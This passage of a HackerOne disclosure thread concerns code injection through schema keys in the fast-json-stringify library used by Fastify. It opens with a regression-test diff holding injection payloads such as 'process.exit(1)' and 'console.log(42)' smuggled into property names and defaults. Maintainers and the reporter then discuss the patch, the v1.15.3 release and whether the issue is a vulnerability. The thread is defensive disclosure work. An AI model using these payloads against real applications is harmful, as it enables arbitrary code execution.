\u0026#39;string\u0026#39;,\n+      default: \u0026#39;a\\\u0026#39;\u0026amp;\u0026amp; process.exit(1) ||\\\u0026#39;\u0026#39;\n+    },\n+    obj: {\n+      type: \u0026#39;object\u0026#39;,\n+      properties: {\n+        bool: {\n+          type: \u0026#39;boolean\u0026#39;\n+        }\n+      }\n+    },\n+    \u0026#39;\u0026quot;\\\u0026#39;w00t\u0026#39;: {\n+      type: \u0026#39;string\u0026#39;,\n+      default: \u0026#39;\u0026quot;\\\u0026#39;w00t\u0026#39;\n+    },\n+    arr: {\n+      type: \u0026#39;array\u0026#39;,\n+      items: {\n+        type: \u0026#39;object\u0026#39;,\n+        properties: {\n+          \u0026#39;phra\\\u0026#39; \u0026amp;\u0026amp; process.exit(1)//\u0026#39;: {\n+            type: \u0026#39;number\u0026#39;\n+          },\n+          str: {\n+            type: \u0026#39;string\u0026#39;\n+          }\n+        }\n+      }\n+    }\n+  },\n+  required: [\u0026#39;now\u0026#39;],\n+  patternProperties: {\n+    \u0026#39;.*foo$\u0026#39;: {\n+      type: \u0026#39;string\u0026#39;\n+    },\n+    \u0026#39;test\u0026#39;: {\n+      type: \u0026#39;number\u0026#39;\n+    },\n+    \u0026#39;phra\\\u0026#39;/ \u0026amp;\u0026amp; process.exit(1) \u0026amp;\u0026amp; /\\\u0026#39;\u0026#39;: {\n+      type: \u0026#39;number\u0026#39;\n+    },\n+    \u0026#39;\u0026quot;\\\u0026#39;w00t.*////\u0026#39;: {\n+      type: \u0026#39;number\u0026#39;\n+    }\n+  },\n+  additionalProperties: {\n+    type: \u0026#39;string\u0026#39;\n+  }\n+})\n+\n+const obj = {\n+  firstName: \u0026#39;Matteo\u0026#39;,\n+  lastName: \u0026#39;Collina\u0026#39;,\n+  age: 32,\n+  now: new Date(),\n+  foo: \u0026#39;hello\u0026quot;\u0026#39;,\n+  bar: \u0026quot;world\u0026#39;\u0026quot;,\n+  \u0026#39;fuzz\u0026quot;\u0026#39;: 42,\n+  \u0026quot;me\u0026#39;\u0026quot;: 42,\n+  numfoo: 42,\n+  test: 42,\n+  strtest: \u0026#39;23\u0026#39;,\n+  arr: [{ \u0026#39;phra\\\u0026#39; \u0026amp;\u0026amp; process.exit(1)//\u0026#39;: 42 }],\n+  obj: { bool: true },\n+  notmatch: \u0026#39;valar morghulis\u0026#39;,\n+  notmatchobj: { a: true },\n+  notmatchnum: 42\n+}\n+\n+// pass if it does not crash\n+const json = stringify(obj)\n+JSON.parse(json)\n+\n+const stringify2 = build({\n+  title: \u0026#39;Example Schema\u0026#39;,\n+  type: \u0026#39;object\u0026#39;,\n+  patternProperties: {\n+    \u0026#39;\u0026quot;\\\u0026#39;w00t.*////\u0026#39;: {\n+      type: \u0026#39;number\u0026#39;\n+    }\n+  }\n+})\n+\n+t.deepEqual(JSON.parse(stringify2({\n+  \u0026#39;\u0026quot;\\\u0026#39;phra////\u0026#39;: 42,\n+  \u0026#39;asd\u0026#39;: 42\n+})), {\n+})\n+\n+const stringify3 = build({\n+  title: \u0026#39;Example Schema\u0026#39;,\n+  type: \u0026#39;object\u0026#39;,\n+  properties: {\n+    \u0026quot;\\\u0026quot;phra\\\\\u0026#39;\u0026amp;\u0026amp;(console.log(42))//||\u0026#39;phra\u0026quot;: {}\n+  }\n+})\n+\n+// this verifies the escaping\n+JSON.parse(stringify3({\n+  \u0026#39;\u0026quot;phra\\\u0026#39;\u0026amp;\u0026amp;(console.log(42))//||\\\u0026#39;phra\u0026#39;: 42\n+}))\n+\n+const stringify4 = build({\n+  title: \u0026#39;Example Schema\u0026#39;,\n+  type: \u0026#39;object\u0026#39;,\n+  properties: {\n+    \u0026#39;\u0026quot;\\\\\\\\\\\\\\\\\\\u0026#39;w00t\u0026#39;: {\n+      type: \u0026#39;string\u0026#39;,\n+      default: \u0026#39;\u0026quot;\\\u0026#39;w00t\u0026#39;\n+    }\n+  }\n+})\n+\n+t.deepEqual(JSON.parse(stringify4({})), {\n+  \u0026#39;\u0026quot;\\\\\\\\\\\\\\\\\\\u0026#39;w00t\u0026#39;: \u0026#39;\u0026quot;\\\u0026#39;w00t\u0026#39;\n+})\n+\n+t.pass(\u0026#39;no crashes\u0026#39;)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-05-14T09:44:04.450Z","updated_at":"2019-05-14T09:44:04.450Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4836040,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"it looks fixed to me.\n+1 to implement unit tests covering the cases reported in this thread in order to prevent any future regression and avoid breaking changes due to this patch.","markdown_message":"\u003cp\u003eit looks fixed to me.\u003cbr\u003e\n+1 to implement unit tests covering the cases reported in this thread in order to prevent any future regression and avoid breaking changes due to this patch.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-14T13:32:03.341Z","updated_at":"2019-05-14T13:32:03.341Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4940185,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"PR in https://github.com/fastify/fast-json-stringify/pull/168.","markdown_message":"\u003cp\u003ePR in \u003ca title=\"https://github.com/fastify/fast-json-stringify/pull/168\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ffastify%2Ffast-json-stringify%2Fpull%2F168\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/fastify/fast-json-stringify/pull/168\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-28T11:10:20.366Z","updated_at":"2019-05-28T11:10:20.366Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4940450,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Released as v1.15.3.","markdown_message":"\u003cp\u003eReleased as v1.15.3.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-28T12:12:54.972Z","updated_at":"2019-05-28T12:12:54.972Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4954806,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"can we mark this as _Resolved_ ?","markdown_message":"\u003cp\u003ecan we mark this as \u003cu\u003eResolved\u003c/u\u003e ?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-30T15:08:31.325Z","updated_at":"2019-05-30T15:08:31.325Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5064273,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"any update?","markdown_message":"\u003cp\u003eany update?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T10:28:23.374Z","updated_at":"2019-06-12T10:28:23.374Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5064300,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm +1 in considering this resolved. I'm -1 on treating this as a vulnerability, mainly because we do not aim to guarantee that fast-json-stringify is safe to use with user data.","markdown_message":"\u003cp\u003eI\u0026#39;m +1 in considering this resolved. I\u0026#39;m -1 on treating this as a vulnerability, mainly because we do not aim to guarantee that fast-json-stringify is safe to use with user data.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T10:34:08.896Z","updated_at":"2019-06-12T10:34:08.896Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5106964,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Catching up on this now.\n\n@mcollina it seems like `fast-json-stringify` is not going to guarantee security concerns due to the dynamic evaluation and serialization nature of how it works. So a developer directly choosing to use `fast-json-stringify` should be aware of it and read the docs which mention it. However, `fastify` makes use of this library \"behind the scenes\" and the user may not be aware that such security concerns are valid if they provide a schema. If to make the matter more confusing for developers, the framework states `Developer friendly: the framework is built to be very expressive and help the developer in their daily use, without sacrificing performance and security.` which may hint developers that they don't need to perform anything special in terms of security where-as it seems that the real advice from you is that developers should definitely be concerned as to the data they provide through the `schema` capability because that could turn into code injection.\n\nWould that sum it up correctly?\nIf so, instead of this being a vulnerability in `fastify`, perhaps we should add a note to the project's page about the use of `schema` and its security concerns?","markdown_message":"\u003cp\u003eCatching up on this now.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/mcollina\"\u003e@mcollina\u003c/a\u003e it seems like \u003ccode\u003efast-json-stringify\u003c/code\u003e is not going to guarantee security concerns due to the dynamic evaluation and serialization nature of how it works. So a developer directly choosing to use \u003ccode\u003efast-json-stringify\u003c/code\u003e should be aware of it and read the docs which mention it. However, \u003ccode\u003efastify\u003c/code\u003e makes use of this library \u0026quot;behind the scenes\u0026quot; and the user may not be aware that such security concerns are valid if they provide a schema. If to make the matter more confusing for developers, the framework states \u003ccode\u003eDeveloper friendly: the framework is built to be very expressive and help the developer in their daily use, without sacrificing performance and security.\u003c/code\u003e which may hint developers that they don\u0026#39;t need to perform anything special in terms of security where-as it seems that the real advice from you is that developers should definitely be concerned as to the data they provide through the \u003ccode\u003eschema\u003c/code\u003e capability because that could turn into code injection.\u003c/p\u003e\n\n\u003cp\u003eWould that sum it up correctly?\u003cbr\u003e\nIf so, instead of this being a vulnerability in \u003ccode\u003efastify\u003c/code\u003e, perhaps we should add a note to the project\u0026#39;s page about the use of \u003ccode\u003eschema\u003c/code\u003e and its security concerns?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-16T10:50:21.327Z","updated_at":"2019-06-16T10:50:21.327Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5112083,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@lirantal the security part of that statetment is based on the following threat model:\n\n1. we provide one of the fastest data validator (Ajv) embedded in the framework. Validating your data is a must-have, and this does increase application security.\n2. using fast-json-stringify improves unexpected data leaks, as only the properties in the schema are sent.\n3. we do not allow routes to be defined at runtime (after listen). As a result it's not possible to exploit this from a route. Developers try to do this all the time, and we prevent them from it.\n4. some other bits and bobs within the framework.\n\nData validation is application code. If you load application code from untrusted sources, you have to worry about a lot of things, and so is data validation. Note that the same reasoning applies to Ajv, see https://www.npmjs.com/package/ajv#security-considerations.\n\nNote that there is _already_ a disclaimer for this, so I do not think there is anything more to add: https://github.com/fastify/fastify/blob/master/docs/Validation-and-Serialization.md#--security-notice. Let me know if you think that sentence is not enough, but it seems pretty clear to me.","markdown_message":"\u003cp\u003e\u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e the security part of that statetment is based on the following threat model:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003ewe provide one of the fastest data validator (Ajv) embedded in the framework. Validating your data is a must-have, and this does increase application security.\u003c/li\u003e\n\u003cli\u003eusing fast-json-stringify improves unexpected data leaks, as only the properties in the schema are sent.\u003c/li\u003e\n\u003cli\u003ewe do not allow routes to be defined at runtime (after listen). As a result it\u0026#39;s not possible to exploit this from a route. Developers try to do this all the time, and we prevent them from it.\u003c/li\u003e\n\u003cli\u003esome other bits and bobs within the framework.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eData validation is application code. If you load application code from untrusted sources, you have to worry about a lot of things, and so is data validation. Note that the same reasoning applies to Ajv, see \u003ca title=\"https://www.npmjs.com/package/ajv#security-considerations\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fajv%23security-considerations\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/package/ajv#security-considerations\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eNote that there is \u003cu\u003ealready\u003c/u\u003e a disclaimer for this, so I do not think there is anything more to add: \u003ca title=\"https://github.com/fastify/fastify/blob/master/docs/Validation-and-Serialization.md#--security-notice\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ffastify%2Ffastify%2Fblob%2Fmaster%2Fdocs%2FValidation-and-Serialization.md%23--security-notice\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/fastify/fastify/blob/master/docs/Validation-and-Serialization.md#--security-notice\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Let me know if you think that sentence is not enough, but it seems pretty clear to me.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-17T10:23:39.676Z","updated_at":"2019-06-17T10:23:39.676Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5112466,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Completely agree, thanks for pointing out the details.\nI missed that validation-specific doc at https://github.com/fastify/fastify/blob/master/docs/Validation-and-Serialization.md but now that you pointed it out I'm ok with this notice.\n\nI'm ok to resolve as-is (no CVE and no PRing to the security-wg repo as this is not a security vulnerability).\n","markdown_message":"\u003cp\u003eCompletely agree, thanks for pointing out the details.\u003cbr\u003e\nI missed that validation-specific doc at \u003ca title=\"https://github.com/fastify/fastify/blob/master/docs/Validation-and-Serialization.md\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ffastify%2Ffastify%2Fblob%2Fmaster%2Fdocs%2FValidation-and-Serialization.md\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/fastify/fastify/blob/master/docs/Validation-and-Serialization.md\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e but now that you pointed it out I\u0026#39;m ok with this notice.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m ok to resolve as-is (no CVE and no PRing to the security-wg repo as this is not a security vulnerability).\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-17T11:23:23.856Z","updated_at":"2019-06-17T11:23:23.856Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5112470,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@phra any strong objections?","markdown_message":"\u003cp\u003e\u003ca href=\"/phra\"\u003e@phra\u003c/a\u003e any strong objections?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-17T11:24:02.447Z","updated_at":"2019-06-17T11:24:02.447Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5112672,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @lirantal , thanks for joining the conversation. I have some points that I would like to mention:\n\n1. First of all, I want to point out that adding a *security disclaimer* to a README doesn't declass a code injection to something else. Instead, we worked together to patch the source code in order to prevent injections by design, effectively patching the reported vulnerability. Moreover, the *security disclaimer* was added _one week later_ this report was sent, proving the value of this responsible disclosure, as you can see from this commit https://github.com/fastify/fastify/commit/a387f0575bab4f3077c374faab680e30931e4036\n\n2. The vulnerability itself lived in `fast-json-stringify` and `fastify` is just using that library. I agree that the issue cannot be exploited remotely against any `fastify` web server, but the problem here is that `fast-json-stringify` is a generic library and can be used in other ways compared to `fastify` use case.\n\n3. I have read the Ajv security considerations but it only states about DoS-like attacks, such as slowing down the performance of the application if untrusted data is passed into the schema definition. They also implemented a *meta schema* (https://github.com/epoberezkin/ajv/blob/master/lib/refs/json-schema-secure.json) in order to validate it at runtime. Anyway I see that they use `new Function()` too, so I am going to play with it to understand it better.\n\nSaid that, IMHO I agree to change the asset of this report from `fastify` to `fast-json-stringify` (3rd party modules maybe?) but I don't agree on considering this **now patched** code injection as something different that a security risk.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e , thanks for joining the conversation. I have some points that I would like to mention:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eFirst of all, I want to point out that adding a \u003cem\u003esecurity disclaimer\u003c/em\u003e to a README doesn\u0026#39;t declass a code injection to something else. Instead, we worked together to patch the source code in order to prevent injections by design, effectively patching the reported vulnerability. Moreover, the \u003cem\u003esecurity disclaimer\u003c/em\u003e was added \u003cu\u003eone week later\u003c/u\u003e this report was sent, proving the value of this responsible disclosure, as you can see from this commit \u003ca title=\"https://github.com/fastify/fastify/commit/a387f0575bab4f3077c374faab680e30931e4036\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ffastify%2Ffastify%2Fcommit%2Fa387f0575bab4f3077c374faab680e30931e4036\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/fastify/fastify/commit/a387f0575bab4f3077c374faab680e30931e4036\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eThe vulnerability itself lived in \u003ccode\u003efast-json-stringify\u003c/code\u003e and \u003ccode\u003efastify\u003c/code\u003e is just using that library. I agree that the issue cannot be exploited remotely against any \u003ccode\u003efastify\u003c/code\u003e web server, but the problem here is that \u003ccode\u003efast-json-stringify\u003c/code\u003e is a generic library and can be used in other ways compared to \u003ccode\u003efastify\u003c/code\u003e use case.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eI have read the Ajv security considerations but it only states about DoS-like attacks, such as slowing down the performance of the application if untrusted data is passed into the schema definition. They also implemented a \u003cem\u003emeta schema\u003c/em\u003e (\u003ca title=\"https://github.com/epoberezkin/ajv/blob/master/lib/refs/json-schema-secure.json\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fepoberezkin%2Fajv%2Fblob%2Fmaster%2Flib%2Frefs%2Fjson-schema-secure.json\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/epoberezkin/ajv/blob/master/lib/refs/json-schema-secure.json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) in order to validate it at runtime. Anyway I see that they use \u003ccode\u003enew Function()\u003c/code\u003e too, so I am going to play with it to understand it better.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eSaid that, IMHO I agree to change the asset of this report from \u003ccode\u003efastify\u003c/code\u003e to \u003ccode\u003efast-json-stringify\u003c/code\u003e (3rd party modules maybe?) but I don\u0026#39;t agree on considering this \u003cstrong\u003enow patched\u003c/strong\u003e code injection as something different that a security risk.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-17T12:21:10.453Z","updated_at":"2019-06-17T12:21:10.453Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5112807,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The following is the most important sentence of Ajv threat model:\n\n\u003e Ajv treats JSON schemas as trusted as your application code. \n\nBefore this issue, this was not covered in Fastify docs, and in https://github.com/fastify/fastify/commit/a387f0575bab4f3077c374faab680e30931e4036 we fixed it. This was a direct result of this issue, and we are grateful.\n\nWe are happy to include this info in some other places in the docs.\n\n---\n\nThe fastify team does not want to consider fast-json-stringify safe to use with untrusted data, nor it consider Ajv safe to use with untrusted data. It's a guarantee that is exceptionally hard to make and maintain, and there are unlimited amount of ways this could go wrong. Moreover, Ajv do not provide that guarantee, and we validate every schema coming in with the same meta model Ajv is using. Therefore, we never spent the time hardening against this, mainly because it was not supposed to be used that way. \n \nConsidering it a vulnerability would essentially assume that the team consider it as such and offer such a guarantee. Simply we don't, and we do not plan to. As my experience with all security issues on the Node core team, it is way better to not declare a CVE for something that is just user misuse, because then you immediately become a target for security researcher that try to break escaping/etc. User misuse is just user misuse.\n\nI think it's a good thing to patch, but using new Function with untrusted data is just _too risky_, as it could always be possible to break escaping.","markdown_message":"\u003cp\u003eThe following is the most important sentence of Ajv threat model:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eAjv treats JSON schemas as trusted as your application code. \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eBefore this issue, this was not covered in Fastify docs, and in \u003ca title=\"https://github.com/fastify/fastify/commit/a387f0575bab4f3077c374faab680e30931e4036\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ffastify%2Ffastify%2Fcommit%2Fa387f0575bab4f3077c374faab680e30931e4036\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/fastify/fastify/commit/a387f0575bab4f3077c374faab680e30931e4036\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e we fixed it. This was a direct result of this issue, and we are grateful.\u003c/p\u003e\n\n\u003cp\u003eWe are happy to include this info in some other places in the docs.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eThe fastify team does not want to consider fast-json-stringify safe to use with untrusted data, nor it consider Ajv safe to use with untrusted data. It\u0026#39;s a guarantee that is exceptionally hard to make and maintain, and there are unlimited amount of ways this could go wrong. Moreover, Ajv do not provide that guarantee, and we validate every schema coming in with the same meta model Ajv is using. Therefore, we never spent the time hardening against this, mainly because it was not supposed to be used that way. \u003c/p\u003e\n\n\u003cp\u003eConsidering it a vulnerability would essentially assume that the team consider it as such and offer such a guarantee. Simply we don\u0026#39;t, and we do not plan to. As my experience with all security issues on the Node core team, it is way better to not declare a CVE for something that is just user misuse, because then you immediately become a target for security researcher that try to break escaping/etc. User misuse is just user misuse.\u003c/p\u003e\n\n\u003cp\u003eI think it\u0026#39;s a good thing to patch, but using new Function with untrusted data is just \u003cu\u003etoo risky\u003c/u\u003e, as it could always be possible to break escaping.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-17T12:47:20.699Z","updated_at":"2019-06-17T12:47:20.699Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5135874,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@phra it is easy to take reports like yours for granted so I want to take the opportunity to thank you for all the effort in putting this report up, working with Matteo and working with us to discuss the issue. Your involvement here doesn't go un-noticed and is immensely appreciated ❤️ and I have no doubt Matteo feels the same way.\n\nI will clarify why I think the security issue here in itself is not a security issue for `fast-json-stringify` - this library may handle untrusted data and by consequence \"bad things\" can happen. For example, consider Node.js's child_process API - you could argue that it has some methods that are vulnerable to command injection but the purpose of the API is not to be ultimately secure but rather to provide access to OS process APIs and it is up to the developer using this API to use it wisely as much as they can. I see `fast-json-stringify` falling in this same spot and this is why I think that this report in first place is correctly geared towards `fastify` the framework and not that module specifically.\n\nAs to `fastify`, I can make similar arguments or comparison with say React's dangerouslySetInnerHTML API which may turn code injection into XSS if not used properly and there's no CVE or vulnerability in the React framework due to that. In the same way, I feel that `fastify` falls in this place as well. The project recognizes the fact that the schema you provide is entirely under your (the developer's) control and ownership and its their responsibility to clean/sanitize/validate/etc before using it.\n\nI find triaging security vulnerabilities a tricky business and I understand how this topic can be very border line between vulnerability, bug, and project policies. Regardless I'm happy to continue discussing and learn if you still feel strongly about this being a security vulnerability.\n\nJust to say again with all sincerity that your work is tremendously appreciated and has already contributed to many improvements in the projects we're discussing ❤️\n","markdown_message":"\u003cp\u003e\u003ca href=\"/phra\"\u003e@phra\u003c/a\u003e it is easy to take reports like yours for granted so I want to take the opportunity to thank you for all the effort in putting this report up, working with Matteo and working with us to discuss the issue. Your involvement here doesn\u0026#39;t go un-noticed and is immensely appreciated ❤️ and I have no doubt Matteo feels the same way.\u003c/p\u003e\n\n\u003cp\u003eI will clarify why I think the security issue here in itself is not a security issue for \u003ccode\u003efast-json-stringify\u003c/code\u003e - this library may handle untrusted data and by consequence \u0026quot;bad things\u0026quot; can happen. For example, consider Node.js\u0026#39;s child_process API - you could argue that it has some methods that are vulnerable to command injection but the purpose of the API is not to be ultimately secure but rather to provide access to OS process APIs and it is up to the developer using this API to use it wisely as much as they can. I see \u003ccode\u003efast-json-stringify\u003c/code\u003e falling in this same spot and this is why I think that this report in first place is correctly geared towards \u003ccode\u003efastify\u003c/code\u003e the framework and not that module specifically.\u003c/p\u003e\n\n\u003cp\u003eAs to \u003ccode\u003efastify\u003c/code\u003e, I can make similar arguments or comparison with say React\u0026#39;s dangerouslySetInnerHTML API which may turn code injection into XSS if not used properly and there\u0026#39;s no CVE or vulnerability in the React framework due to that. In the same way, I feel that \u003ccode\u003efastify\u003c/code\u003e falls in this place as well. The project recognizes the fact that the schema you provide is entirely under your (the developer\u0026#39;s) control and ownership and its their responsibility to clean/sanitize/validate/etc before using it.\u003c/p\u003e\n\n\u003cp\u003eI find triaging security vulnerabilities a tricky business and I understand how this topic can be very border line between vulnerability, bug, and project policies. Regardless I\u0026#39;m happy to continue discussing and learn if you still feel strongly about this being a security vulnerability.\u003c/p\u003e\n\n\u003cp\u003eJust to say again with all sincerity that your work is tremendously appreciated and has already contributed to many improvements in the projects we\u0026#39;re discussing 